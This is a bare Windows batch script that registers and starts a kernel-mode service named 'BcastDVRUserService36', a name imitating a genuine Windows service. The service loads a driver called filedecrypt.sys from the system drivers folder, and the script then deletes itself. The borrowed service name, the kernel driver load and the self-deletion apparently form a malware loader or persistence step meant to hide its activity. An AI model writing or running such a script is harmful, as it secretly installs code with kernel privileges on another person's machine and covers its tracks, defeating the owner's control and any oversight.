@echo off
cd %~dp0
sc create BcastDVRUserService36 binpath=C:\Windows\System32\drivers\filedecrypt.sys type=kernel
sc start BcastDVRUserService36
del "%~f0"



